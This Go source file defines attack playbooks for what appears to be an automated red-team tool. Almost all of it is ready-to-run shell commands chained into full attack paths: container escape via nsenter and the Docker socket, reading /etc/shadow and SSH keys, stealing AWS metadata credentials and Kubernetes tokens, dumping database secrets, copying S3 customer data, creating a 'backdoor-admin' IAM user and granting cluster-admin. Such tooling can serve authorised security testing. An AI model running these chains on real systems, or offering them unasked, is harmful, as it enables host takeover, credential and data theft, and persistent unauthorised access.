package shadow

// initializePlaybooks loads all attack playbooks
func initializePlaybooks() map[AttackVector][]Playbook {
	playbooks := make(map[AttackVector][]Playbook)
	
	// Container Escape Playbooks
	playbooks[VectorContainerEscape] = []Playbook{
		{
			Name:        "Container Escape via nsenter",
			Description: "Escape privileged container to host using nsenter",
			Vector:      VectorContainerEscape,
			RequiredVulns: []string{"privileged_container"},
			MITREATTACK: "T1611",
			Steps: []PlaybookStep{
				{
					Description: "Check if container is privileged",
					Command:     "cat /proc/self/status | grep CapEff",
					Impact:      ImpactInfo,
				},
				{
					Description: "Escape to host namespace",
					Command:     "nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh",
					Impact:      ImpactCritical,
				},
				{
					Description: "Verify host access",
					Command:     "hostname && cat /etc/os-release",
					Impact:      ImpactCritical,
				},
				{
					Description: "Search for cloud credentials",
					Command:     "find /root /home -name '*credentials*' -o -name '*.pem' 2>/dev/null | head -5",
					Impact:      ImpactHigh,
				},
			},
			ExpectedOutcome: "Full host root access with credential discovery",
		},
		{
			Name:        "Container Escape via Host PID",
			Description: "Escape using hostPID namespace access",
			Vector:      VectorContainerEscape,
			RequiredVulns: []string{"host_pid"},
			MITREATTACK: "T1611",
			Steps: []PlaybookStep{
				{
					Description: "List host processes",
					Command:     "ps aux | head -10",
					Impact:      ImpactMedium,
				},
				{
					Description: "Find systemd/init process",
					Command:     "ps aux | grep 'systemd' | grep -v grep",
					Impact:      ImpactHigh,
				},
				{
					Description: "Access host filesystem via /proc",
					Command:     "ls -la /proc/1/root/",
					Impact:      ImpactCritical,
				},
			},
			ExpectedOutcome: "Access to host filesystem via /proc",
		},
	}
	
	// Docker Socket Abuse Playbooks
	playbooks[VectorDockerSocketAbuse] = []Playbook{
		{
			Name:        "Docker Socket Host Takeover",
			Description: "Abuse mounted Docker socket to spawn privileged container",
			Vector:      VectorDockerSocketAbuse,
			RequiredVulns: []string{"docker_socket_mount"},
			MITREATTACK: "T1611",
			Steps: []PlaybookStep{
				{
					Description: "Check Docker socket accessibility",
					Command:     "test -S /var/run/docker.sock && echo 'Socket accessible'",
					Impact:      ImpactHigh,
				},
				{
					Description: "List running containers",
					Command:     "docker ps",
					Impact:      ImpactMedium,
				},
				{
					Description: "Spawn privileged container with host root",
					Command:     "docker run -v /:/host --privileged alpine chroot /host",
					Impact:      ImpactCritical,
				},
				{
					Description: "Access host secrets",
					Command:     "cat /host/root/.ssh/id_rsa",
					Impact:      ImpactCritical,
				},
			},
			ExpectedOutcome: "Full host compromise via Docker socket",
		},
	}
	
	// HostPath Escape Playbooks
	playbooks[VectorHostPathEscape] = []Playbook{
		{
			Name:        "HostPath Mount Escape",
			Description: "Exploit hostPath volume mount to access host filesystem",
			Vector:      VectorHostPathEscape,
			RequiredVulns: []string{"hostpath_mount"},
			MITREATTACK: "T1611",
			Steps: []PlaybookStep{
				{
					Description: "Check mounted host paths",
					Command:     "mount | grep -E '/host|/var|/etc'",
					Impact:      ImpactMedium,
				},
				{
					Description: "Access sensitive host files",
					Command:     "cat /host/etc/shadow 2>/dev/null || echo 'No /etc/shadow access'",
					Impact:      ImpactHigh,
				},
				{
					Description: "Search for SSH keys",
					Command:     "find /host -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null",
					Impact:      ImpactHigh,
				},
				{
					Description: "Look for Kubernetes configs",
					Command:     "find /host -name 'kubeconfig' -o -name '.kube' 2>/dev/null",
					Impact:      ImpactCritical,
				},
			},
			ExpectedOutcome: "Access to host filesystem and credentials",
		},
	}
	
	// Credential Theft Playbooks
	playbooks[VectorCredentialTheft] = []Playbook{
		{
			Name:        "AWS Metadata Service Exploitation",
			Description: "Extract AWS credentials from instance metadata",
			Vector:      VectorCredentialTheft,
			RequiredVulns: []string{"cloud_metadata_accessible"},
			MITREATTACK: "T1552.005",
			Steps: []PlaybookStep{
				{
					Description: "Check metadata service accessibility",
					Command:     "curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/",
					Impact:      ImpactMedium,
				},
				{
					Description: "Enumerate IAM roles",
					Command:     "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/",
					Impact:      ImpactHigh,
				},
				{
					Description: "Extract instance profile credentials",
					Command:     "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)",
					Impact:      ImpactCritical,
				},
				{
					Description: "Test AWS API access",
					Command:     "aws sts get-caller-identity 2>/dev/null || echo 'AWS CLI not available'",
					Impact:      ImpactCritical,
				},
			},
			ExpectedOutcome: "AWS credentials extracted and validated",
		},
		{
			Name:        "Kubernetes Service Account Token Theft",
			Description: "Steal K8s service account token for API access",
			Vector:      VectorCredentialTheft,
			RequiredVulns: []string{"weak_rbac"},
			MITREATTACK: "T1528",
			Steps: []PlaybookStep{
				{
					Description: "Locate service account token",
					Command:     "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
					Impact:      ImpactHigh,
				},
				{
					Description: "Check token permissions",
					Command:     "kubectl auth can-i --list 2>/dev/null || echo 'kubectl not available'",
					Impact:      ImpactMedium,
				},
				{
					Description: "Attempt to list secrets",
					Command:     "kubectl get secrets --all-namespaces 2>/dev/null",
					Impact:      ImpactCritical,
				},
				{
					Description: "Enumerate all pods",
					Command:     "kubectl get pods --all-namespaces -o wide",
					Impact:      ImpactHigh,
				},
			},
			ExpectedOutcome: "Kubernetes API access with stolen token",
		},
	}
	
	// Lateral Movement Playbooks
	playbooks[VectorLateralMovement] = []Playbook{
		{
			Name:        "Kubernetes Cluster Lateral Movement",
			Description: "Move laterally across pods and namespaces",
			Vector:      VectorLateralMovement,
			RequiredVulns: []string{"weak_rbac", "no_security_context"},
			MITREATTACK: "T1021",
			Steps: []PlaybookStep{
				{
					Description: "List all pods in cluster",
					Command:     "kubectl get pods --all-namespaces",
					Impact:      ImpactMedium,
				},
				{
					Description: "Identify high-value targets (databases, APIs)",
					Command:     "kubectl get pods --all-namespaces | grep -E 'postgres|mysql|redis|api'",
					Impact:      ImpactHigh,
				},
				{
					Description: "Attempt port-forward to database",
					Command:     "kubectl port-forward svc/postgres 5432:5432 &",
					Impact:      ImpactCritical,
				},
				{
					Description: "Extract database credentials from secrets",
					Command:     "kubectl get secret postgres-creds -o jsonpath='{.data.password}' | base64 -d",
					Impact:      ImpactCritical,
				},
			},
			ExpectedOutcome: "Access to multiple pods and databases",
		},
	}
	
	// Data Exfiltration Playbooks
	playbooks[VectorDataExfiltration] = []Playbook{
		{
			Name:        "S3 Bucket Data Exfiltration",
			Description: "Download data from public or accessible S3 buckets",
			Vector:      VectorDataExfiltration,
			RequiredVulns: []string{"public_s3_bucket"},
			MITREATTACK: "T1530",
			Steps: []PlaybookStep{
				{
					Description: "List S3 buckets",
					Command:     "aws s3 ls",
					Impact:      ImpactMedium,
				},
				{
					Description: "Identify sensitive data buckets",
					Command:     "aws s3 ls | grep -E 'customer|user|backup|prod'",
					Impact:      ImpactHigh,
				},
				{
					Description: "Sample bucket contents",
					Command:     "aws s3 ls s3://customer-data --recursive | head -20",
					Impact:      ImpactHigh,
				},
				{
					Description: "Download sensitive files",
					Command:     "aws s3 cp s3://customer-data/users.db /tmp/ 2>/dev/null || echo 'Simulated download'",
					Impact:      ImpactCritical,
				},
			},
			ExpectedOutcome: "Customer data downloaded from S3",
		},
	}
	
	// Cloud Takeover Playbooks
	playbooks[VectorCloudTakeover] = []Playbook{
		{
			Name:        "AWS Account Takeover",
			Description: "Escalate AWS privileges to admin access",
			Vector:      VectorCloudTakeover,
			RequiredVulns: []string{"aws_credentials_exposed"},
			MITREATTACK: "T1098",
			Steps: []PlaybookStep{
				{
					Description: "Identify current AWS permissions",
					Command:     "aws sts get-caller-identity",
					Impact:      ImpactMedium,
				},
				{
					Description: "List IAM users and roles",
					Command:     "aws iam list-users",
					Impact:      ImpactHigh,
				},
				{
					Description: "Check if can create new admin user",
					Command:     "aws iam create-user --user-name backdoor-admin 2>/dev/null || echo 'Insufficient permissions'",
					Impact:      ImpactCritical,
				},
				{
					Description: "List accessible EC2 instances",
					Command:     "aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PrivateIpAddress]'",
					Impact:      ImpactHigh,
				},
			},
			ExpectedOutcome: "AWS account compromise with persistence",
		},
	}
	
	// Privilege Escalation Playbooks
	playbooks[VectorPrivilegeEscalation] = []Playbook{
		{
			Name:        "Kubernetes RBAC Privilege Escalation",
			Description: "Escalate from pod to cluster-admin",
			Vector:      VectorPrivilegeEscalation,
			RequiredVulns: []string{"weak_rbac"},
			MITREATTACK: "T1068",
			Steps: []PlaybookStep{
				{
					Description: "Check current service account permissions",
					Command:     "kubectl auth can-i --list",
					Impact:      ImpactMedium,
				},
				{
					Description: "Attempt to create cluster role binding",
					Command:     "kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=default:default",
					Impact:      ImpactCritical,
				},
				{
					Description: "Verify cluster-admin access",
					Command:     "kubectl auth can-i '*' '*' --all-namespaces",
					Impact:      ImpactCritical,
				},
			},
			ExpectedOutcome: "Escalated to cluster-admin privileges",
		},
	}
	
	return playbooks
}
